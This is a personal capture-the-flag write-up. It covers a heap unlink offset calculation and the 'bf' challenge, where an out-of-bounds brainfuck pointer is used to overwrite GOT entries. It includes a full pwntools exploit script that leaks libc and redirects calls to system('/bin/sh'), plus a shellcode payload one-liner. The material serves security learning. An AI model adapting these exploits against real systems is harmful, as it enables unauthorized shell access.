('STACK: ', '0xbfdedea4', ' HEAP: ', '0x88b1410')

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xfbad2088 
EDX: 0x88b141c ("AAAA\264\336\336\277CCCC\034\024\213\b\264\336\336\277c")
ESI: 0x1 
EDI: 0xb7754000 --> 0x1b2db0 
EBP: 0xbfdedeb8 --> 0x0 
ESP: 0xbfdedea0 --> 0x1 
EIP: 0x80485ff (<main+208>:   mov    ecx,DWORD PTR [ebp-0x4])
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

What the above essentially shows is that ebp has a 20 byte difference from the start of the stack leak, which when subtracted by 4, gives a 16 byte offset between the two.

So I need to use the stack address + 0x10.
Then, in <main+212>, my value (currently FFFF) is subtracted by 4 and the memory at that location is loaded as the next instruction.

So what I need to do is have the memory address of shell in my input, and then I replace FFFF with the memory address of that memory address + 4. In this case, since the heap data begins 8 bytes after the heap address leak, it would be an offset of (8 + 4 = c).

So I would use heap + 0xc.

The exact python script I used should be called unlink.py.

Tips: 
Start up GDB
Start up python script, send all the input you need
make sure to include connection.interactive()
locate the PID stated in the script output
use GDB to type 'attach PID' (obv replace PID)
then you can use GDB as usual (you may have to type c in both terminals)

new one? Look for one on ports and networks.


-----------------------------------------
bf

So, I actually had a lot of trouble with this one. So I looked up a solution and instead spent some time analyzing it. (Thank God I actually learned something from it or else this would've just been a case of laziness).

So, for this challenge, you essentially need to use brainfuck instructions with the exceptions of [ ], which creates a loop

(Below ripped right from Wikipedia)
Character   Meaning 
>           increment the data pointer (to point to the next cell to the right).
<           decrement the data pointer (to point to the next cell to the left).
+           increment (increase by one) the byte at the data pointer.
-           decrement (decrease by one) the byte at the data pointer.
.           output the byte at the data pointer.
,           accept one byte of input, storing its value in the byte at the data pointer.

The bug that this program has is that it allows you to decrement to a negative position in the brainfuck array. When you look at the other instructions, this reveals that you have the capability to read and write from memory. However, the range you can actually act in is quite limited. My initial plan was to decrement the data pointer until I reached a GOT function's address so I could override it with the address of my shellcode. 

However, brainfuck's limitation only allows me to use pre-existing code, or else it segfaults (NX is activated). So this means that I need to override the GOT function with another function more useful to me. Since there isn't a give_shell function or anything, I need to somehow enter the string "/bin/sh\x00" and call system with that as its parameter.

So, looking through the disassembly, I spot two function calls very close to each other in main:

   0x08048717 <+166>:   call   0x80484c0 <memset@plt>
   0x0804871c <+171>:   mov    eax,ds:0x804a040
   0x08048721 <+176>:   mov    DWORD PTR [esp+0x8],eax
   0x08048725 <+180>:   mov    DWORD PTR [esp+0x4],0x400
   0x0804872d <+188>:   lea    eax,[esp+0x2c]
   0x08048731 <+192>:   mov    DWORD PTR [esp],eax
   0x08048734 <+195>:   call   0x8048450 <fgets@plt>

If I override memset with gets and fgets with system, I can input /bin/sh into a system call. 

from pwn import *

p = process('./bf')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p.recvline_startswith('type')
p.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
p.recv(1)
x=p.recv(4)[::-1]

jump=0x080484E0
p.send(p32(jump))

system=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['system']
gets=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['gets']

print(x.encode('hex'))
print(hex(system))
p.send(p32(system))
p.send(p32(gets))
p.sendline('/bin/sh\x00')
p.interactive()

p.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.') is perhaps the most important line.
The first 112 '<' is to go back 112 spots from the initial memory location of the array to get to the function address of putchar so it can be overriden with (in this case) the _start function in c, which essentially just warps you back to the start of main. 

The next '.' is to initialize the function putchar so that it's address can be locked (it's randomized each time the program is run), while the next '.>' * 4 is to output the randomized location where putchar is at. This is so calculations can be made and offsets can be applied in order to find the locations of other GOT functions. 

The next '<' * (4 + 32) moves you back to override fgets (0x804a030 - 32 = 0x804a010, which is fgets location) with the value that allows you to call system. The rest of the code is just overriding memset with gets, and a final '.' which calls putchar (which now is _start) and then consequently calls memset and fgets to create a shell for you.


Tips: When given a libc or NX is on, consider the approach in which you override functions to get a shell

$(python -c 'print "<" * 112 + "." + ",>" * 4 + ".\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n" + "\xfe\xef\xff\xbf"')

Above is my code that would probably work is NX was disabled.